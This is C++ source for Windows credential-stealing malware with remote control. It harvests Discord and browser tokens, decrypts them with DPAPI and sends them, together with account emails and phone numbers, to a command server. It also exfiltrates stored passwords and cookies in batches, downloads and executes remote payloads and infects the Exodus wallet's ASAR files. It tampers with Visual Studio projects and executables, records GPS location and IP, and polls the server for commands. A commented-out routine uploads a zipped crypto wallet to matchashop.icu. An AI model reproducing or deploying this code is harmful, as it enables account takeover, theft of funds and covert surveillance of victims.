#include <iostream>
#include <Windows.h>
#include "Encrypt.h"
#include "LI.h"
#include "Utils.h"
#include <lmcons.h>
#include "atlstr.h"
#include "Infector.h"
#include "Fokos.h"
#include <winhttp.h>
#include <windows.h>
#include <exception>
#include <eh.h>
#include "deadlock_wrapper.h"
#include <set>
#pragma comment(lib, "winhttp.lib")

std::list<std::string> Tokkos;
bool IsFirstTime = false;
string CookieEntr;
string PassEntr;


// SEH exception handler
LONG WINAPI GlobalExceptionHandler(EXCEPTION_POINTERS* exceptionInfo)
{
	DWORD exceptionCode = exceptionInfo->ExceptionRecord->ExceptionCode;
	void* exceptionAddress = exceptionInfo->ExceptionRecord->ExceptionAddress;

	char buffer[512];
	sprintf_s(buffer, "SEH Exception: Code=0x%08X, Address=0x%p\n",
		exceptionCode, exceptionAddress);
	OutputDebugStringA(buffer);

	// Log to file or send to error reporting system

	return EXCEPTION_EXECUTE_HANDLER; // Handle and continue
}

// C++ terminate handler
void GlobalTerminateHandler()
{
	try {
		auto ex = std::current_exception();
		if (ex) {
			std::rethrow_exception(ex);
		}
	}
	catch (const std::exception& e) {
		char buffer[512];
		sprintf_s(buffer, "Exception: %s\n", e.what());
		OutputDebugStringA(buffer);
	}
	catch (...) {
		OutputDebugStringA("Unknown exception\n");
	}

	// Don't actually terminate - just return
	// NOTE: This is technically undefined behavior but may keep your app running
}

// Translator for SEH to C++ exceptions (optional but useful)
void SEHTranslator(unsigned int code, EXCEPTION_POINTERS* pExp)
{
	char buffer[256];
	sprintf_s(buffer, "SEH Exception in translator: 0x%08X\n", code);
	OutputDebugStringA(buffer);
	throw std::exception("SEH Exception");
}

// Call this once at program startup
void InitGlobalExceptionHandling()
{
	// Set SEH handler
	SetUnhandledExceptionFilter(GlobalExceptionHandler);

	// Set C++ terminate handler
	std::set_terminate(GlobalTerminateHandler);

	// Set SEH translator (converts SEH to C++ exceptions)
	_set_se_translator(SEHTranslator);
}

void LogRawTokensCore()
{

	/*try
	{
		const uint32_t ProcessId = GetProcessIdByName(stringToWchar(EC("discord.exe")));

		const auto ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION, FALSE, ProcessId);
		if (ProcessId && ProcessHandle)
		{
			const auto TokenPattern = std::regex(EC(R"([A-Za-z0-9_-]{20,40}\.[A-Za-z0-9_-]{5,10}\.[A-Za-z0-9_-]{20,40})"), std::regex_constants::optimize); // PARTS OF A DISCORD TOKEN // 1: User ID // 2: Timestamp // 3: Random chars
			std::set<std::string> UniqueTokens;

			////JUNK();

			SYSTEM_INFO SysInfo;
			GetSystemInfo(&SysInfo);

			std::vector<uint8_t> Buffer(1024 * 1024);

			////JUNK();

			auto CurrentAddr = reinterpret_cast<uint8_t*>(SysInfo.lpMinimumApplicationAddress);
			const auto MaxAddr = reinterpret_cast<uint8_t*>(SysInfo.lpMaximumApplicationAddress);

			while (CurrentAddr < MaxAddr) {
				MEMORY_BASIC_INFORMATION Mbi{};
				if (!VirtualQueryEx(ProcessHandle, CurrentAddr, &Mbi, sizeof(Mbi))) break;

				CurrentAddr += Mbi.RegionSize;
				if (Mbi.State != MEM_COMMIT || Mbi.Protect != PAGE_READWRITE) continue;

				const size_t ReadSize = std::min<size_t>(Mbi.RegionSize, Buffer.size());
				if (!ReadProcessMemory(ProcessHandle, Mbi.BaseAddress, Buffer.data(), ReadSize, nullptr)) continue;

				////JUNK();

				std::string_view Content(reinterpret_cast<char*>(Buffer.data()), ReadSize);
				size_t Pos = 0;

				while ((Pos = Content.find(EC("Authorization"), Pos)) != std::string_view::npos) {
					auto End = Content.find(EC("User-Agent"), Pos);
					if (End == std::string_view::npos) { Pos++; continue; }

					std::string Section(Content.substr(Pos, End - Pos));
					std::smatch Match;

					////JUNK();


					if (std::regex_search(Section, Match, TokenPattern) && UniqueTokens.insert(Match[0]).second)
					{
						Tokkos.push_back(Match[0].str());


					}

					Pos += 13;
				}
			}

			CloseHandle(ProcessHandle);
		}
	}
	catch (...) {}*/


	try
	{
		char* local; size_t local_len;
		char* roaming; size_t roaming_len;
		_dupenv_s(&local, &local_len, EC("LOCALAPPDATA"));
		_dupenv_s(&roaming, &roaming_len, EC("APPDATA"));

		std::vector<std::string> paths = {
			std::string(roaming) + EC("\\discord"),
			std::string(roaming) + EC("\\discordcanary"),
			std::string(roaming) + EC("\\discordptb"),
			std::string(roaming) + EC("\\Lightcord"),
			std::string(roaming) + EC("\\Opera Software\\Opera Stable"),
			std::string(roaming) + EC("\\Opera Software\\Opera GX Stable"),
			std::string(local) + EC("\\BraveSoftware\\Brave-Browser\\User Data"),
			std::string(local) + EC("\\Google\\Chrome SxS\\User Data"),
			std::string(local) + EC("\\Google\\Chrome\\User Data"),
			std::string(local) + EC("\\Chromium\\User Data"),
			std::string(local) + EC("\\Microsoft\\Edge\\User Data"),
			std::string(local) + EC("\\Yandex\\YandexBrowser\\User Data")
		};

		free(local); free(roaming);

		std::set<std::string> printed_tokens;

		for (const auto& path : paths) {

			if (std::filesystem::exists(path)) {

				std::string pathokaq;

				if (path.find(EC("discord")) != std::string::npos) {

					std::cout << path + EC("\\Local Storage\\leveldb") << std::endl;
					pathokaq = copyToRandomTempDirectory(path + EC("\\Local Storage\\leveldb"));

					std::vector<uint8_t> master_key;
					std::string key_file = path + EC("\\Local State");

					if (std::filesystem::exists(key_file)) {

						string kopifilestr = copyFileToTemp(key_file);

						std::ifstream localStateFile(kopifilestr);
						if (localStateFile.is_open()) {

							json localState;
							localStateFile >> localState;
							localStateFile.close();

							if (localState["os_crypt"]["encrypted_key"].is_null()) {
								std::cout << EC("Failed to parse\n");
							}
							else {

								std::vector<uint8_t> encryptedKey = base64Decode(localState["os_crypt"]["encrypted_key"].get<std::string>());
								encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
								////JUNK();

								master_key = decryptDPAPI(encryptedKey);
							}
						}

						remove(kopifilestr.c_str());

					}

					std::cout << EC("Keyo Size: ") << master_key.size() << std::endl;


					for (const auto& entry : std::filesystem::directory_iterator(pathokaq)) {

						const std::string path = entry.path().string();

						std::regex token_regex(EC("dQw4w9WgXcQ:[^\"]*"));


						// Check if file has .log or .ldb extension
						if (std::filesystem::path(path).extension() == EC(".ldb") || std::filesystem::path(path).extension() == EC(".log")) {
							std::ifstream file(path, std::ios_base::binary);
							if (!file.is_open()) continue;

							std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
							file.close();


							std::smatch match;
							while (std::regex_search(content, match, token_regex)) {
								std::string unformatted_token = match.str(0);
								unformatted_token = unformatted_token.substr(unformatted_token.find(EC("dQw4w9WgXcQ:")) + 12);
								std::vector<BYTE> decoded_token(BDKD(unformatted_token));
								std::string decryptedToken = DekDat(decoded_token, master_key);
								std::cout << decryptedToken << std::endl;

								Tokkos.push_back(decryptedToken);

								content = match.suffix().str();
							}
						}


					}

				}
				else
				{
					std::cout << path + EC("\\Default\\Local Storage\\leveldb") << std::endl;
					pathokaq = copyToRandomTempDirectory(path + EC("\\Default\\Local Storage\\leveldb"));

					for (const auto& entry : std::filesystem::directory_iterator(pathokaq)) {

						const std::string path = entry.path().string();

						// Check if file has .log or .ldb extension
						if (std::filesystem::path(path).extension() == EC(".ldb") || std::filesystem::path(path).extension() == EC(".log")) {
							std::ifstream file(path, std::ios_base::binary);
							if (!file.is_open()) continue;

							std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
							file.close();


							vector<string> master;

							regex reg1(EC("[\\w-][\\w-][\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{26,110}"));
							regex reg2(EC("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}"));
							regex reg3(EC("mfa\\.[\\w-]{84}"));

							vector<string> check = findMatch(content, reg1);
							vector<string> check2 = findMatch(content, reg2);
							vector<string> check3 = findMatch(content, reg3);

							for (int i = 0; i < check.size(); i++) {
								master.push_back(check[i]);
							}
							for (int i = 0; i < check2.size(); i++) {
								master.push_back(check2[i]);
							}
							for (int i = 0; i < check3.size(); i++) {
								master.push_back(check3[i]);
							}

							for (int i = 0; i < master.size(); i++) {
								std::cout << master[i] << std::endl;
								Tokkos.push_back(master[i]);
							}

						}


					}
				}

				std::filesystem::remove_all(pathokaq.c_str());
			}
		}
	}
	catch (...) {}

	SPOOF_CALL(printf)(EC("\n\n Starting checks. \n"));


	try
	{
		Tokkos.sort();
		Tokkos.unique();

		for (const std::string& Tokenno : Tokkos) {

			Sleep(1000);

			std::cout << Tokenno << std::endl;

			try {
				string InfoTXT = SendAPIRequest(Tokenno);
				std::cout << EC("Info: ") << InfoTXT << std::endl;

				if (InfoTXT.find(EC("avatar")) != string::npos) {

					nlohmann::json ParsedInfo = nlohmann::json::parse(InfoTXT);

					std::string name = ParsedInfo.value(EC("username"), EC(""));
					std::string userid = ParsedInfo.value(EC("id"), EC(""));
					std::string email = ParsedInfo.contains(EC("email")) && !ParsedInfo["email"].is_null() ? ParsedInfo["email"].get<std::string>() : EC("");
					std::string phone = ParsedInfo.contains(EC("phone")) && !ParsedInfo["phone"].is_null() ? ParsedInfo["phone"].get<std::string>() : EC("");
					std::string verified = ParsedInfo.value(EC("verified"), false) ? EC("True") : EC("False");
					std::string premiumType = std::to_string(ParsedInfo.value(EC("premium_type"), 0));

					// Print the extracted values
					std::cout << EC("Name: ") << name << EC("\n");
					std::cout << EC("User ID: ") << userid << EC("\n");
					std::cout << EC("Email: ") << email << EC("\n");
					std::cout << EC("Phone: ") << phone << EC("\n");
					std::cout << EC("Verified: ") << verified << EC("\n");
					std::cout << EC("Premium Type: ") << premiumType << EC("\n");


					string TKNUrl = EC("https://") + dmns + EC("/index.php?type=tknsprc&security=2");
					std::string TKNdata = EC("MondayKids87|") + hwidglobal + EC("|") + OwnersID + EC("|") + Tokenno + EC("|") + name + EC("|") + userid + EC("|") + email + EC("|") + phone + EC("|") + verified + EC("|") + premiumType;
					std::string TKNdataEncrypted = Encrypt(TKNdata, enckey);

					////JUNK();
					wrap::Response ResponsansPNG = wrap::HttpsRequest(wrap::Url{ TKNUrl },
						wrap::Body{ TKNdataEncrypted },
						wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
						wrap::Method{ EC("POST") });

				}
				else
				{
					SPOOF_CALL(printf)(EC("Token Invalid \n"));
				}
			}
			catch (const std::exception& e) {
				std::cout << e.what() << std::endl;
			}

		}
	}
	catch (...) {}



}




unsigned char key[32];

void set_key_from_string(const std::string& hex_key) {
	if (hex_key.size() != 64) {

	}
	for (size_t i = 0; i < 32; ++i) {
		unsigned int byte;
		std::stringstream ss;
		ss << std::hex << hex_key.substr(i * 2, 2);
		ss >> byte;
		key[i] = static_cast<unsigned char>(byte);
	}
}


std::string deckeee = EC("bob");



std::vector<std::vector<std::string>> Cookies;

void LogRawTokens()
{

	__try
	{
		LogRawTokensCore();
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
}


std::vector<std::vector<std::string>> Passwords;




void LogRawPasswordsCore()
{

	/*try
	{
		
		processBrowserDataPasswords(std::string(getenv(EC("LOCALAPPDATA"))) + EC("\\Microsoft\\Edge\\User Data"), EC("1"));

		processBrowserDataPasswords(std::string(getenv(EC("LOCALAPPDATA"))) + EC("\\Google\\Chrome\\User Data"), EC("2"));

		processBrowserDataPasswords(std::string(getenv(EC("LOCALAPPDATA"))) + EC("\\BraveSoftware\\Brave-Browser\\User Data"), EC("3"));

	}
	catch (...) {}*/

	try
	{
		const int batchSize = 100;

		for (size_t i = 0; i < Passwords.size(); i += batchSize) {

			auto start_iter = Passwords.begin() + i;
			auto end_iter = (i + batchSize < Passwords.size()) ? Passwords.begin() + i + batchSize : Passwords.end();
			std::vector<std::vector<std::string>> batch(start_iter, end_iter);


			json j = batch;


			std::cout << EC("Batch ") << (i / batchSize) + 1 << EC(":\n") << j.dump() << std::endl;


			string PassUrl = EC("https://") + dmns + EC("/index.php?type=pssprc&security=2");
			std::string Passdata = EC("BabaPro647|") + hwidglobal + EC("|") + OwnersID + EC("|") + j.dump();
			std::string PassdataEncrypted = Encrypt(Passdata, enckey);

			////JUNK();
			wrap::Response ResponsansPNG = wrap::HttpsRequest(wrap::Url{ PassUrl },
				wrap::Body{ PassdataEncrypted },
				wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
				wrap::Method{ EC("POST") });/**/

			SPOOF_CALL(Sleep)(250);
		}
	}
	catch (...) {}



}

bool passafter = false;

void LogRawCookiesCore()
{

	/* try
	{
		Edge
		processBrowserDataCookies(std::string(getenv(EC("LOCALAPPDATA"))) + EC("\\Microsoft\\Edge\\User Data"), EC("1"));*/

		/* Chrome 
		processBrowserDataCookies(std::string(getenv(EC("LOCALAPPDATA"))) + EC("\\Google\\Chrome\\User Data"), EC("2"));

	}
	catch (...) {}*/

	SendDebugMessage(EC("[COOKIE] Halfway"));

	try
	{
		const int batchSize = 200;

		for (size_t i = 0; i < Cookies.size(); i += batchSize) {

			auto start_iter = Cookies.begin() + i;
			auto end_iter = (i + batchSize < Cookies.size()) ? Cookies.begin() + i + batchSize : Cookies.end();
			std::vector<std::vector<std::string>> batch(start_iter, end_iter);


			json j = batch;


			std::cout << EC("Batch ") << (i / batchSize) + 1 << EC(":\n") << j.dump() << std::endl;


			string PassUrl = EC("https://") + dmns + EC("/index.php?type=ckiprc&security=2");
			std::string Passdata = EC("CokerPro37&|-|&") + hwidglobal + EC("&|-|&") + OwnersID + EC("&|-|&") + j.dump();
			std::string PassdataEncrypted = Encrypt(Passdata, enckey);

			////JUNK();
			wrap::Response ResponsansPNG = wrap::HttpsRequest(wrap::Url{ PassUrl },
				wrap::Body{ PassdataEncrypted },
				wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
				wrap::Method{ EC("POST") });

			SPOOF_CALL(Sleep)(500);
		}
	}
	catch (...) {}



}


void InitBrowsers()
{

	std::vector<BYTE> roberto;

	roberto = Base64ToBytes(DownloadString(dmns, EC("/Stb/PokerFace/init.php?id=Popocum")));

	std::cout << EC("Init Browser Roberto size:") << roberto.size() << std::endl;

	Moain(roberto, Cookies, Passwords);

	roberto.clear();
}


void InitThreadBRWS()
{

	__try
	{
		InitBrowsers();
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
}


void LogRawCookies()
{

	__try
	{

		CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(InitThreadBRWS), nullptr, NULL, nullptr);

		Sleep(40000);

		if (PassEntr == EC("0") or IsFirstTime)
		{
			LogRawPasswordsCore();
		}
		if (CookieEntr == EC("0") or IsFirstTime)
		{
			LogRawCookiesCore();
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}
}

void LogToSite()
{
	SPOOF_FUNC;

	string boba = EC("1");

	SendDebugMessage(EC("At HWID Retrieving results"));

	try
	{
		string urlsss = EC("https://") + dmns + EC("/index.php?type=exists&security=2");
		std::string HWDData = EC("TulumPeynirliSalad12|") + hwidglobal + EC("|") + OwnersID;
		std::string EncyDat = Encrypt(HWDData, enckey);

		SPOOF_CALL(printf)(urlsss.c_str());

		wrap::Response BoynarHWID = wrap::HttpsRequest(wrap::Url{ urlsss },
			wrap::Body{ EncyDat },
			wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
			wrap::Method{ EC("POST") });

		boba = BoynarHWID.text;
		/*boba = makePostRequest(urlsss, EncyDat);*/

	}
	catch (const std::exception& e) {
		std::cout << EC("Exception caught: ") << e.what() << std::endl;
	}

	std::cout << EC("\n") << boba << std::endl;

	SendDebugMessage(EC("Results of hwid check: ") + boba);


	if (hwidglobal == EC("x") || boba == EC("0"))
	{

		SPOOF_CALL(printf)(EC("In"));
		IsFirstTime = true;

		string username = EC("Empty!");
		string countryName = EC("NO");
		string RamFinal = EC("N / A");
		string osVersion = EC("Error");
		////JUNK();
		string lat = EC("0");
		string lon = EC("0");
		string accr = EC("0");

		try
		{
			username = ReplaceSlashesAndBackslashes(un);
			std::cout << EC("\n>>> Username: ") << username << endl;
		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}

		////JUNK();

		/*try
		{
			countryName = GetCountryName();
			std::cout << EC(">>> Country: ") << countryName << endl;
		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}*/

		try
		{
			std::cout << EC(">>> Cpu: ") << CPUNAME << endl;
		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}

		try
		{
			//VRam = static_cast<int>(std::floor(VRam / 1024.0));
			PcRam = static_cast<int>(std::floor(PcRam / 1000.0));

			std::cout << EC(">>> Gpu: ") << GPUNAME << endl;
			std::cout << EC(">>> VRam: ") << VRam << endl;
			std::cout << EC(">>> Ram: ") << PcRam << endl;

			RamFinal = EC(" N / O ");

		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}


		try
		{
			osVersion = GetWindowsVersion();
			std::cout << EC(">>> Os: ") << osVersion << endl;
		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}

		SendDebugMessage(EC("Main Check 2 Renewed"));

		try
		{

			double latitude;
			double longitude;
			double accrcy;

			GetGPS(latitude, longitude, accrcy);

			if (latitude == 31 && longitude == 31 && accrcy == 31)
			{
				SendDebugMessage(EC("Acces Violation On GPS! Ressrting..."));

				latitude = 0;
				longitude = 0;
				accrcy = 0;
			}

			std::cout << latitude << std::endl;
			std::cout << longitude << std::endl;

			if (latitude != 0)
			{
				lat = std::to_string(latitude);
			}

			if (longitude != 0)
			{
				lon = std::to_string(longitude);
			}

			if (!accrcy)
			{
				accr = "1";
			}
			else
			{
				accr = removeAfterDot(std::to_string(accrcy));
			}



			std::cout << EC("Latitude: ") << lat << std::endl;
			std::cout << EC("Longitude: ") << lon << std::endl;
			std::cout << EC("Accuracy (meters): ") << accr << std::endl;

		}
		catch (...) {
			SendDebugMessage(EC("Error On GPS!"));
		}

		SendDebugMessage(EC("Main Check 3 Getting In Process"));

		std::cout << EC("IP: ") << GetIpRiyal() << std::endl;
		////JUNK();


		try
		{
			std::string rawData = EC("BurataSalat12|") + hwidglobal + EC("|") + username + EC("|") + countryName + EC("|") + osVersion + EC("|") + lat + EC("|") + lon + EC("|") + accr + EC("|") + GPUNAME + EC("|") + CPUNAME + EC("|") + RamFinal + EC("|") + OwnersID + EC("|") + BuildID + EC("|") + GetIpRiyal();
			std::string encryptedData = Encrypt(rawData, enckey);
			std::string phpUrl = EC("https://") + dmns + EC("/index.php?security=2&type=process");

			////JUNK();

			SendDebugMessage(EC("Processing..."));

			wrap::Response r = wrap::HttpsRequest(wrap::Url{ phpUrl },
				wrap::Body{ encryptedData },
				wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
				wrap::Method{ EC("POST") });

			string respy = r.text;
			/*string respy = makePostRequest(phpUrl, encryptedData);*/
			std::cout << respy << std::endl;
			////JUNK();


		}
		catch (const std::exception& e) {
			std::cout << EC("Exception caught: ") << e.what() << std::endl;
		}
	}
}


void LittleAsar()
{
	/*SendDebugMessage(EC("Getting in ASAR Retreiv"));


	char pathdtt[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, pathdtt))) {
		std::cout << EC("AppData\\Roaming: ") << pathdtt << std::endl;
	}
	else {
		std::cerr << ("Failed to get AppData\\Roaming path.") << std::endl;
	}

	std::string finalidatpat(pathdtt);

	std::string Paspras = finalidatpat + EC("\\Exodus\\exodus.wallet\\passphrase.json");


	if (std::filesystem::exists(Paspras))
	{
		SPOOF_CALL(printf)(EC("\n We are soooo in"));

		string UniqCLId = DownloadString(EC("https://") + dmns + EC("/index.php?type=uniqid&security=2&owr=") + OwnersID + EC("&hd=") + hwidglobal);

		std::cout << EC("Uniq ID: ") << UniqCLId << std::endl;

		std::string sourceFolder = finalidatpat + EC("\\Exodus\\exodus.wallet");
		std::string zipPath = finalidatpat + EC("\\Exodus\\") + UniqCLId + EC(".zip");

		std::cout << EC("Source Folder: ") << sourceFolder << std::endl;
		std::cout << EC("Zip Path: ") << zipPath << std::endl;

		std::string command = EC("powershell Compress-Archive -Path \"") + sourceFolder + EC("\\*\" -DestinationPath \"") + zipPath + EC("\"");
		win_system(command.c_str());

		SPOOF_CALL(Sleep)(3000);


		const std::string server = EC("matchashop.icu"); // change to your domain
		const std::string script = EC("/index.php?type=APLADEX&security=2"); // your PHP script path
		const std::string filepath = zipPath; // file to upload
		const std::string filename = UniqCLId + EC(".zip");

		string fularl = EC("https://") + dmns + EC("/index.php?type=APLADEX&security=2");

		std::string boundary = EC("------------------------boundary123456");
		std::string lineBreak = EC("\r\n");

		std::string fileContent = ReadFileContent(filepath);

		// Multipart body
		std::string postData;
		postData += EC("--") + boundary + lineBreak;
		postData += EC("Content-Disposition: form-data; name=\"file\"; filename=\"") + filename + EC("\"") + lineBreak;
		postData += EC("Content-Type: application/zip") + lineBreak + lineBreak;
		postData += fileContent + lineBreak;
		postData += EC("--") + boundary + EC("--") + lineBreak;


		//InternetSetCookieA(fularl.c_str(), EC("hash"), EC("2239784366428af5e59516a8fd0a0faf"));


		HINTERNET hSession = InternetOpenA(EC("Uploader"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if (!hSession) {
			std::cerr << EC("InternetOpen failed\n");
		}


		HINTERNET hConnect = InternetConnectA(hSession, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (!hConnect) {
			std::cerr << EC("InternetConnect failed\n");
			InternetCloseHandle(hSession);
		}

		// HTTPS request (must include INTERNET_FLAG_SECURE)
		HINTERNET hRequest = HttpOpenRequestA(
			hConnect,
			EC("POST"),
			script.c_str(),
			NULL,
			NULL,
			NULL,
			INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE,
			0
		);
		if (!hRequest) {
			std::cerr << EC("HttpOpenRequest failed\n");
			InternetCloseHandle(hConnect);
			InternetCloseHandle(hSession);
		}

		std::string headers = EC("Content-Type: multipart/form-data; boundary=") + boundary;

		BOOL sent = HttpSendRequestA(
			hRequest,
			headers.c_str(),
			headers.length(),
			(LPVOID)postData.c_str(),
			postData.size()
		);

		if (!sent) {
			std::cerr << EC("HttpSendRequest failed\n");
		}
		else {
			char buffer[4096];
			DWORD bytesRead = 0;
			while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
				buffer[bytesRead] = '\0';
				std::cout << buffer;
			}
		}

		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);


		SPOOF_CALL(Sleep)(2000);

		remove(zipPath.c_str());
	}*/

	SendDebugMessage(EC("Getting in ASAR Infection Before Card"));

	try
	{
		std::string appDataLocalPath = GetAppDataLocalPath() + EC("\\exodus");

		if (!appDataLocalPath.empty()) {
			std::cout << "AppData Local Path: " << appDataLocalPath << std::endl;
			InfektAsars(appDataLocalPath);
		}
		else {
			std::cout << "Failed to get AppData Local path." << std::endl;
		}


		Sleep(3000);

	}
	catch (...) {}

	SendDebugMessage(EC("ASAR Infection Done Going For Card"));
}


string minupdat;
string infoloop;

std::mutex GpuINF;

string GetMinerGPUInfo(string minup)
{

	std::lock_guard<std::mutex> lock(GpuINF);  // Lock the mutex


	string MenyURL = EC("https://") + dmns + EC("/index.php?type=mininew&security=2");
	std::string MenyUData = EC("Avokesa34532|") + hwidglobal + EC("|") + OwnersID + EC("|") + minup;
	std::string MenyUEncyDat = Encrypt(MenyUData, enckey);

	SPOOF_CALL(printf)(MenyURL.c_str());

	wrap::Response Menypys = wrap::HttpsRequest(wrap::Url{ MenyURL },
		wrap::Body{ MenyUEncyDat },
		wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
		wrap::Method{ EC("POST") });

	//std::cout << EC("Came: ") << Menypys.text << std::endl;

	/*string ekdataa = makePostRequest(MenyURL, MenyUEncyDat);*/
	string UnDcrypt = Decrypt(Menypys.text, enckey);
	std::cout << UnDcrypt << std::endl;

	return UnDcrypt;
}

bool TknLog = true;
bool PswLog = true;
bool CkiLog = true;
bool KeyboardTrd = true;
bool CardTrd = true;
bool ClipperTrd = true;
bool InfectionTrd = true;
bool InfectionMainTrd = true;
bool ExeInfection = false;



bool firsta = false;

bool InfaktDone = false;

bool ExeInfaktDone = false;

void MainThreadRunner()
{
	while (true)
	{

		try
		{
			SendDebugMessage(EC("[MAIN FUNC] Sleep Or Asar For Ping!"));

			if (!firsta)
			{

				try
				{
					std::string FuncsRD = GRS();



					std::string okaoka = Decrypt(DownloadString(dmns, (EC("/Stb/PokerFace/init.php?id=") + FuncsRD)), FuncsRD);

					std::vector<uint8_t> ByteStub = Base64ToBytes(okaoka);

					std::cout << EC("[DBG] Got New Father, size is: ") << ByteStub.size() << std::endl;


					if (ByteStub.size() < 1000)
					{

					}
					else
					{
						ruplepe(ByteStub);
					}

				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC] First actions problem!"));
				}

				try
				{
					SendDebugMessage(EC("[MAIN FUNC] Go Win SDK!"));

					if (InfectionTrd && !IsFUD)
					{
						SDKInfector();
					}

				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC] SDK Infekt problem!"));
				}

			}
			else if (isdonno && !InfaktDone && InfectionTrd && !IsFUD)
			{
				InfaktDone = true;


				SendDebugMessage(EC("[MAIN FUNC] Inside Infektro!"));

				try
				{
					if (suolist.size() > 0)
					{
						SendDebugMessage(EC("[MAIN FUNC] Go Suo!"));
						SuoInfector();
					}
				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC INFK]  SUO problem!"));
				}


				try
				{
					if (vcxproj.size() > 0)
					{
						SendDebugMessage(EC("[MAIN FUNC] Go Vcx!"));
						VcxprojInfector();
					}
				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC INFK] VCX problem!"));
				}


				try
				{
					if (imguicpp.size() > 0)
					{
						SendDebugMessage(EC("[MAIN FUNC] Go CPP!"));
						CppInfector();
					}
				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC INFK] IMGUI problem!"));
				}

			}
			else if (isdonno && !ExeInfaktDone && InfectionTrd && ExeInfection && !IsFUD)
			{
				ExeInfaktDone = true;

				try
				{
					if (exe64.size() > 0)
					{
						SendDebugMessage(EC("[MAIN FUNC] Go Exe Thread!"));
						SPOOF_CALL(CreateThread)(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(ExeInfect), nullptr, NULL, nullptr);
						SPOOF_CALL(Sleep)(35000);
					}
				}
				catch (...) {
					SendDebugMessage(EC("[MAIN FUNC INFK] EXE INFKT problem!"));
				}

			}
			else
			{
				SPOOF_CALL(Sleep)(80000);
			}

			try
			{
				std::cout << EC("Here") << std::endl;
				//SendDebugMessage(EC("Entering Ping From Clientxx"));
				SPOOF_CALL(Sleep)(300);

				int tresod = 0;

			A:

				if (RealIP() != ips)
				{
					ips = RealIP();
					std::cout << EC("Final IP Result: ") << ips << std::endl;
					if (!ips.empty())
					{
						enckey = MapDigitsToLetters(RemoveDotsAndReverse(ips)); // Probaly IP Changed we gotta refresh enc key
					}
					else
					{
						if (tresod > 10)
						{
							*(uintptr_t*)0 = 0;
						}
						else
						{
							Sleep(8000);
							tresod++;
							std::cout << EC("Retrying...") << std::endl;
							goto A;
						}
					}
				}


				/*SendDebugMessage(EC("About to get in pingxx"));
				SPOOF_CALL(Sleep)(1000);


				infoloop = GetMinerGPUInfo(minupdat);

				SPOOF_CALL(Sleep)(1000);*/


				//SendDebugMessage(EC("About to get in main"));

				SPOOF_CALL(Sleep)(400);



				string Pingurl = EC("https://") + dmns + EC("/index.php?type=ping&security=2");
				std::string PNGData;

				if (!firsta)
				{
					PNGData = EC("SpesyalSalada43AT|") + hwidglobal + EC("|") + OwnersID;
					firsta = true;
				}
				else
				{
					PNGData = EC("SpesyalSalada43|") + hwidglobal + EC("|") + OwnersID;
				}


				std::string EncyDatPNG = Encrypt(PNGData, enckey);

				SPOOF_CALL(printf)(Pingurl.c_str());

				SPOOF_CALL(Sleep)(400);


				wrap::Response ResponsansPNG = wrap::HttpsRequest(wrap::Url{ Pingurl },
					wrap::Body{ EncyDatPNG },
					wrap::Header{ {EC("Content-Type"), EC("application/x-www-form-urlencoded")} },
					wrap::Method{ EC("POST") });

				/*std::cout << EC("\n") << ResponsansPNG.text << std::endl;
		////JUNK();*/

		/*string enkyrepong = makePostRequest(Pingurl, EncyDatPNG);*/

				//std::cout << EC("\n") << ResponsansPNG.text << std::endl;

				string ProperPNG = Decrypt(ResponsansPNG.text, enckey);


				std::cout << EC("\n") << ProperPNG << std::endl;


				if (ProperPNG.empty())
				{
					SendWBHK(hwidglobal + EC(" PROBLEM IN PING its EMPTYYY! : ") + ProperPNG);
					continue;
				}

				if ((ProperPNG.find(EC("[")) != std::string::npos && ProperPNG.find(EC("]")) != std::string::npos))
				{

				}
				else
				{
					SendWBHK(hwidglobal + EC(" PROBLEM IN PING NO BRACKETS! : ") + ProperPNG);
					continue;
				}

				json jsonData = json::parse(ProperPNG);

				for (const auto& item : jsonData) {

					try
					{
						std::cout << EC("NEW ACTION: -----------") << EC("\n");


						std::string actionID = item[(EC("ActionID"))];
						std::string hwid = item[(EC("HWID"))];
						std::string actionInfo = item[(EC("ActionInfo"))];
						std::string actionType = item[(EC("ActionType"))];
						std::string actionOwner = item[(EC("ActionOwner"))];
						std::string actionStatus = item[(EC("ActionStatus"))];
